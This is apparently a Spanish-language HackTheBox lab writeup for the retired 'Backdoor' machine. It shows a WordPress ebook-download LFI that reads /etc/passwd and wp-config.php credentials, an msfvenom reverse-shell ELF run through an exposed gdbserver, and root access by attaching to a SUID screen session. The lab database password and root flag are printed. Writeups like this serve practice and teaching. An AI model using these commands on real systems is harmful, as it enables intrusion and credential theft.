---
title: "Backdoor — HackTheBox Writeup"
machine: "Backdoor"
platform: "HackTheBox"
os: "Linux"
difficulty: "Easy"
tags: ["CVE", "LFI", "RCE", "Privesc", "Web"]
retired: true
summary: "Escaneo inicial con nmap revelando 3 puertos abiertos:"
draft: false
---
**Dificultad:** Easy | **OS:** Linux | **IP:** 10.129.96.68

## indice

---

### Reconocimiento

Escaneo inicial con nmap revelando 3 puertos abiertos:

- **22** — OpenSSH 8.2p1
- **80** — Apache 2.4.41 + WordPress 5.8.1
- **1337** — Desconocido (waste)

---

### Enumeración Web

WordPress 5.8.1 en el puerto 80. Enumerando plugins encontramos **ebook-download** instalado, vulnerable al **CVE-2016-10924** (Directory Traversal / LFI).

---

### LFI via ebook-download

El parámetro `ebookdownloadurl` no sanitiza la entrada, permitiendo leer archivos del sistema:

`/wp-content/plugins/ebook-download/filedownload.php?`

`ebookdownloadurl=/etc/passwd`Leímos `/etc/passwd` confirmando usuarios **root** y **user**, y de `wp-config.php` extrajimos credenciales de base de datos: `wordpressuser:MQYBJSaD#DxG6qbm`.

---

### Descubrimiento del proceso en puerto 1337

Sin saber qué corre en el 1337, usamos el LFI para leer `/proc/[PID]/cmdline` de forma iterativa. Con **ffuf** generamos 1978 PIDs válidos y buscamos la palabra `gdbserver`:

```jsx
PID 972 => /bin/sh -c while true; do su user -c
"cd /home/user; gdbserver --once 0.0.0.0:1337 /bin/true"; done
```

**gdbserver** corriendo como **user**, escuchando en 0.0.0.0:1337, reiniciándose en bucle.

---

### Explotación — RCE via gdbserver

Generamos un ELF x64 con msfvenom y lo ejecutamos remotamente usando `gdb-multiarch`:

bash

```jsx
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.17.74 LPORT=4444 -f elf -o /tmp/shell.elf

gdb-multiarch /tmp/shell.elf
(gdb) target extended-remote 10.129.96.68:1337
(gdb) remote put /tmp/shell.elf /tmp/shell.elf
(gdb) set remote exec-file /tmp/shell.elf
(gdb) run
```

Penelope capturó la conexión y auto-upgradeó el PTY. Shell como **user** obtenida.

---

### Flag de Usuario

`user@Backdoor:/home/user$ cat user.txt  ✓`

---

### Escalada de Privilegios

![image.png](/img/backdoor/1.png)

![image.png](/img/backdoor/2.png)

Enumerando binarios SUID encontramos `/usr/bin/screen` con el bit SUID habilitado. Verificamos sesiones activas:

bash

```jsx
ls /run/screen/
S-root   ← sesión activa de root
S-user
```

Con una sola línea, attach a la sesión de root:

bash

```jsx
screen -x root/
root@Backdoor:~#
```

El SUID de screen permite hacer attach a sesiones de otros usuarios ejecutando el binario con sus privilegios.

---

### Flag de Root

```jsx
root@Backdoor:~# cat /root/root.txt
849f555fc4a41cff6bb0a7c77723439f  ✓
```

---

### Cadena de Ataque

```jsx
nmap → WordPress 5.8.1 → Plugin ebook-download (LFI)
           ↓
  /proc/PID/cmdline → gdbserver en puerto 1337
           ↓
  gdb-multiarch + ELF x64 → RCE → user shell
           ↓
  /usr/bin/screen SUID → screen -x root/ → root
```

---

### Lecciones

- Los plugins desactualizados de WordPress son superficies de ataque críticas
- `/proc/PID/cmdline` via LFI es una técnica poderosa para descubrir procesos internos
- `gdbserver` expuesto sin autenticación = RCE directo
- Binarios SUID como `screen` permiten escalar privilegios simplemente haciendo attach a sesiones activas de usuarios privilegiados

Writeup por **4Pr3nd1z ———mayo 2026**

# extra

las credenciales encontradas con el LFI no las utilice asi que explorare un poco 

![image.png](/img/backdoor/3.png)

credenciales del admin

![image.png](/img/backdoor/4.png)

![image.png](/img/backdoor/5.png)

en lo que mi latop explota XD sigo enumerando 

![image.png](/img/backdoor/6.png)

### Nada muy jugoso en la DB

Es un WordPress de plantilla básico para la máquina HTB, sin contenido real interesante.

veremos que tal nos va crackeando el hash antes encontrado

y tampoco,parecer ser una contrase;a aleatoria generada con HTB

bueno con esto ya perdi la cuenta de cuanta maquinas he hecho unas treinta y algo gracias por leer :)
